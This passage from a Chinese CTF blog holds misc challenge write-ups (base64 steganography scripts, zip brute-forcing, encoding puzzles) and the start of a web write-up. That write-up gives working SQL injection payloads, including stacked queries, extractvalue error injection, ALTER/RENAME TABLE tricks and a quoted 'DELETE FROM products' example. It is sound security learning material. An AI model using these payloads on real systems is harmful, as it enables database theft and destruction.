s&#x27;</span>aiment</span><br></pre></td></tr></table></figure><p>还有乱码，又想到这个题是杂项里面的，应该不是只让解密的吧，反正还是没有其他的思路。<br>这个emmm没有什么思路了，就找wp学习学习<br>发现是base64隐写<br>学习看这里🔑<a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html">神奇的base64</a><br>然后跑下脚本就出来了吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">&#x27;&#x27;</span>.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).split())</span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)]) <span class="comment">#8 位一组</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020062423371269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>注意是python2写的脚本，需要使用2.7的版本去运行。<br>flag{fazhazhenhaoting}<br>这道题与    （[ACTF新生赛2020]base64隐写）相似，可以一块了解。<br><img src="https://img-blog.csdnimg.cn/20200625204213651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h2><p>两个压缩包都有密码，每个查过一遍，看到flag3.zip上有备注，是一个六位数字的密码。暴力破解就行。<br>然后解码得到一个word文档和影流之主的mp4文件<br><img src="https://img-blog.csdnimg.cn/20200625001336854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后两个不寻常的数字，分别查看视频中相应的帧数所在的画面<br><img src="https://img-blog.csdnimg.cn/20200624234739736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200624234816309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>在灯上，两条信息得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..... ../... ./... ./... ../</span><br><span class="line">dXBfdXBfdXA=</span><br></pre></td></tr></table></figure><p>第一个是敲击码<br><img src="https://img-blog.csdnimg.cn/20200625000702741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>解码得到WLLM，与base64解出的拼接到一起是wllmup_up_up，也就是flag2.zip的密码<br>得到图片用010editor打开<br><img src="https://img-blog.csdnimg.cn/20200625001018203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h2><p>不用爆破，tar zxvf不管用，那么密码就可能没有或者伪加密，或者在备注当中再有就是文件名就是密码。的确是文件名，但是解压好多次都没有得到结果。<br>看了wp，发现要解压300次，应该是不行的。<br>还有就是脚本，这里直接使用脚本可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#来源官方wp#</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;hW1ES89jF&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fz = zipfile.ZipFile(name + <span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fz.extractall(pwd=bytes(name, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    name = fz.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">9</span>]</span><br><span class="line">    fz.close()</span><br></pre></td></tr></table></figure><p>注意，运行自行建立一个新文件夹，然后就是傻瓜式操作。<br>找到flag文件用记事本打开就可以了。</p><h2 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h2><p>打开后是一个文本文件，emmm脑洞太小，想不到。看wp学习<br>emmm💡是十六进制，用HxD编辑保存一下<br><img src="https://img-blog.csdnimg.cn/20200625184322235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>是压缩包，而且压缩包有密码，emmm，也不是伪加密。那就暴力破解试试。<br><img src="https://img-blog.csdnimg.cn/20200625185511229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后打开是个图片，但是图片无法打开。<br>010editor查看，发现图片类型是JFIF,应该是jpg图片格式，所以将文件头修改成jpg格式的。<br><img src="https://img-blog.csdnimg.cn/20200625203116578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后看到图片<br><img src="https://img-blog.csdnimg.cn/20200625203149761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">57</span>cd4cfd4e07505b98048ca106132125&#125;</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h2><p>压缩包损坏，010editor看到前两组数据换了位置，改回来就行<br><img src="https://img-blog.csdnimg.cn/20200625205133701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后解压得出一个word文档，打不开，010editor看出是zip压缩包。改后缀。<br>解压得到一堆文件，根据经验，信息一定藏在document里，果然找到了音符<br><img src="https://img-blog.csdnimg.cn/20200625205712288.png" alt="m0re" loading="lazy"><br>然后使用在线网站解码就行了<br><img src="https://img-blog.csdnimg.cn/20200625205737665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h2><p>解压文件得到的是pcap数据包，题目提示好多图片，wireshark打开导出http对象，保存到一个文件夹中。然后在kali中使用一条命令找到一半的flag</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool *|grep flag</span><br></pre></td></tr></table></figure><p>意思是在当前文件夹中匹配flag字段<br>关于exiftool看这里🔑<a href="https://www.jianshu.com/p/d76457799de1">exiftool的说明使用</a><br><img src="https://img-blog.csdnimg.cn/20200625211836264.png" alt="m0re" loading="lazy"><br>另一半需要在wireshark中找<br>但是我找了半天也没找到，烦躁💣<br>看了wp发现是114……郁闷💔<br><img src="https://img-blog.csdnimg.cn/20200625212803920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>这……我真是🈚🐔8🐟</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</span><br></pre></td></tr></table></figure><h2 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h2><p>两种编码，<br><img src="https://img-blog.csdnimg.cn/20200625213839895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>查询后了解到分别是中文电码和五笔编码<br><img src="https://img-blog.csdnimg.cn/20200625213808112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>第一行——<code>人工智能</code><br><img src="https://img-blog.csdnimg.cn/20200625214436482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>第二行——<code>也要从娃娃抓起</code><br><img src="https://img-blog.csdnimg.cn/20200625214621648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>32位小写</p><h2 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h2><p>打开文件发现一串字符串。<br><img src="https://img-blog.csdnimg.cn/20200625215047983.png" alt="m0re" loading="lazy"><br>十六进制的数字，先转换成10进制的。需要先将这么多数字中两个两个分开。<br>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&quot;</span></span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">2</span>):</span><br><span class="line">    a = a+<span class="string">&quot;0x&quot;</span></span><br><span class="line">    a += s[i:i+<span class="number">2</span>]</span><br><span class="line">    a += <span class="string">&quot;,&quot;</span></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xd4,0xe8,0xe1,0xf4,0xa0,0xf7,0xe1,0xf3,0xa0,0xe6,0xe1,0xf3,0xf4,0xa1,0xa0,0xd4,0xe8,0xe5,0xa0,0xe6,0xec,0xe1,0xe7,0xa0,0xe9,0xf3,0xba,0xa0,0xc4,0xc4,0xc3,0xd4,0xc6,0xfb,0xb9,0xb2,0xb2,0xe1,0xe2,0xb9,0xb9,0xb7,0xb4,0xe1,0xb4,0xb7,0xe3,0xe4,0xb3,0xb2,0xb2,0xe3,0xe6,0xb4,0xb3,0xe2,0xb5,0xb0,0xb6,0xb1,0xb0,0xe6,0xe1,0xe5,0xe1,0xb5,0xfd,</span><br></pre></td></tr></table></figure><p>然后转换成ascii码， 但是转换成10进制时，发现数值都大于128，所以减去128进行尝试，<code>(128=0x80)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0xd4</span>,<span class="number">0xe8</span>,<span class="number">0xe1</span>,<span class="number">0xf4</span>,<span class="number">0xa0</span>,<span class="number">0xf7</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xa0</span>,<span class="number">0xe6</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xf4</span>,<span class="number">0xa1</span>,<span class="number">0xa0</span>,<span class="number">0xd4</span>,<span class="number">0xe8</span>,<span class="number">0xe5</span>,<span class="number">0xa0</span>,<span class="number">0xe6</span>,<span class="number">0xec</span>,<span class="number">0xe1</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xe9</span>,<span class="number">0xf3</span>,<span class="number">0xba</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc4</span>,<span class="number">0xc3</span>,<span class="number">0xd4</span>,<span class="number">0xc6</span>,<span class="number">0xfb</span>,<span class="number">0xb9</span>,<span class="number">0xb2</span>,<span class="number">0xb2</span>,<span class="number">0xe1</span>,<span class="number">0xe2</span>,<span class="number">0xb9</span>,<span class="number">0xb9</span>,<span class="number">0xb7</span>,<span class="number">0xb4</span>,<span class="number">0xe1</span>,<span class="number">0xb4</span>,<span class="number">0xb7</span>,<span class="number">0xe3</span>,<span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0xb2</span>,<span class="number">0xb2</span>,<span class="number">0xe3</span>,<span class="number">0xe6</span>,<span class="number">0xb4</span>,<span class="number">0xb3</span>,<span class="number">0xe2</span>,<span class="number">0xb5</span>,<span class="number">0xb0</span>,<span class="number">0xb6</span>,<span class="number">0xb1</span>,<span class="number">0xb0</span>,<span class="number">0xe6</span>,<span class="number">0xe1</span>,<span class="number">0xe5</span>,<span class="number">0xe1</span>,<span class="number">0xb5</span>,<span class="number">0xfd</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(chr(i<span class="number">-0x80</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200625215914254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>得到flag<br>还找到一个一步走的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_str</span>(<span class="params">str</span>):</span></span><br><span class="line">    hex_str_list=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str)<span class="number">-1</span>,<span class="number">2</span>):</span><br><span class="line">        hex_str=str[i:i+<span class="number">2</span>]</span><br><span class="line">        hex_str_list.append(hex_str)</span><br><span class="line">    print(<span class="string">&quot;hex列表：%s\n&quot;</span>%hex_str_list)</span><br><span class="line">    hex_to_str(hex_str_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span>(<span class="params">hex_str_list</span>):</span></span><br><span class="line">    int_list=[]</span><br><span class="line">    dec_list=[]</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(hex_str_list)):</span><br><span class="line">        int_str=int(<span class="string">&#x27;0x%s&#x27;</span>%hex_str_list[i],<span class="number">16</span>)</span><br><span class="line">        int_list.append(int_str)</span><br><span class="line">        dec_list.append(int_str<span class="number">-128</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(dec_list)):</span><br><span class="line">        flag += chr(dec_list[i])</span><br><span class="line">    print(<span class="string">&quot;转化为十进制int列表：%s\n&quot;</span>%int_list)</span><br><span class="line">    print(<span class="string">&quot;-128得到ASCII十进制dec列表：%s\n&quot;</span>%dec_list)</span><br><span class="line">    print(<span class="string">&#x27;最终答案：%s&#x27;</span>%flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    str=<span class="string">&#x27;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&#x27;</span></span><br><span class="line">    print(<span class="string">&quot;字符串长度：%s&quot;</span>%len(str))</span><br><span class="line">    hex_str(str)</span><br></pre></td></tr></table></figure><h1 id="总结🍗"><a href="#总结🍗" class="headerlink" title="总结🍗"></a>总结🍗</h1><p>密码学了解🍕<br>标准银河字母🔑——<a href="https://image.baidu.com/search/detail?ct=503316480&z=0&ipn=d&word=%E6%A0%87%E5%87%86%E9%93%B6%E6%B2%B3%E5%AD%97%E6%AF%8D&step_word=&hs=2&pn=0&spn=0&di=6490&pi=0&rn=1&tn=baiduimagedetail&is=0,0&istype=0&ie=utf-8&oe=utf-8&in=&cl=2&lm=-1&st=undefined&cs=45684456,4016032718&os=1987249333,3716423177&simid=4256684839,917346164&adpicid=0&lpn=0&ln=1482&fr=&fmq=1593097809502_R&fm=&ic=undefined&s=undefined&hd=undefined&latest=undefined&copyright=undefined&se=&sme=&tab=0&width=undefined&height=undefined&face=undefined&ist=&jit=&cg=&bdtype=0&oriquery=&objurl=http://s10.sinaimg.cn/mw690/001ldFUyzy6Yr8To5LP19&690&fromurl=ippr_z2C$qAzdH3FAzdH3Fks52_z&e3Bftgw_z&e3Bv54_z&e3BvgAzdH3FfAzdH3Fks52_9l9kwl8ja8adoj8y_z&e3Bip4s&gsm=1&rpstart=0&rpnum=0&islist=&querylist=&force=undefined">对照表</a><br>键盘密码<br>当铺密码<br>变异凯撒</p><p>杂项了解🎂<br>JS美化<br>解密电话音<br>工具——dtmf2num.exe<br>工具——FreeFileCamouflage<br>词频分析<br>    - 脚本<br>    - 在线网站<br>新了解的编码——EBCDIC（可用010editor转码）<br>跳舞的小人<br>base64隐写<br>敲击码<br>套娃解压压缩包——脚本<br>音符加密<br>工具——exiftool<br>中文电码<br>五笔编码</p><p>抓住端午节的小尾巴，端午节快乐！<br>以上就是这次总结，再接再厉。加油！加个鸡腿🍗</p><p>文末寄语</p><blockquote><p>欢迎来到现实世界，它糟糕得要命，但你会爱上它的。——《老友记》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————暑假计划第一周</title>
      <link href="/2020/08/23/CTF%E9%A2%98%E8%AE%B0%E2%80%94%E2%80%94%E6%9A%91%E5%81%87%E8%AE%A1%E5%88%92%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
      <url>/2020/08/23/CTF%E9%A2%98%E8%AE%B0%E2%80%94%E2%80%94%E6%9A%91%E5%81%87%E8%AE%A1%E5%88%92%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学期结束，暑假开始，博客也开始正常更新。<br>差不多就是一周一篇CTF题记，一篇漏洞原理的知识，外加随便一篇。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>Web类的题目是在BUUCTF挑选的。</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>查看源码，看到<code>sqlmap是没有灵魂的</code>应该不能使用sqlmap，先尝试其他的办法。<br>直接提交1<br><img src="https://img-blog.csdnimg.cn/20200706102805631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后判断闭合，输入单引号报错，可以判断是字符型SQL注入。<br><code>1&#39; order by 3#</code><br>判断列数，到3已经报错了，说明只有2列。<br>然后先试试联合查询注入<br><img src="https://img-blog.csdnimg.cn/20200706103911187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>正则匹配过滤URL中的<code>select、upload、where还有&quot;.&quot;</code>等，尝试大小写绕过，失败。<br>所以尝试下报错注入，payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(0x0a,concat(0x0a,(database())))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>这个跟我常用的不一样，我以前常用的报错注入payload里面是包含了<code>select</code>的，所以有找了一个没有过滤内容的payload来进行绕过。<br><img src="https://img-blog.csdnimg.cn/20200706105430899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>数据库名是<code>supersqli</code><br>然后就卡住了，查看前面师傅们的wp，了解到了堆叠注入。<br>先了解一下……</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><p>当然堆叠注入还有一定的局限性，这个以后遇到再进行学习。<br>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200706110556458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>爆出来六个数据库名。<br>然后查看所有的表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200706113550500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>查看表中字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;desc words;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200706123157128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>好像是没有什么有效信息，再看另一个</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;desc `1919810931114514`;<span class="comment">#</span></span><br><span class="line"><span class="comment">#注释字段名是数字，查看时用  `  包起来</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200706123319479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个查询flag的方式才是需要解决的。<br>然后看了一个师傅的wp是这么写的，正则过滤没有过滤alert和rename这两个，所以可以使用这两个功能来实现一波骚操作</p><blockquote><p>1.将words表改名为word1或其它任意名字<br>2.1919810931114514改名为words<br>3.将新的word表插入一列，列名为id<br>4.将flag列改名为data</p></blockquote><p>有两个payload，我都进行尝试但是结果没有出flag。先贴一下payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一个</span></span><br><span class="line">?inject=1’; <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`data`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br><span class="line"><span class="comment">#第二个</span></span><br><span class="line">?inject=1’;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span 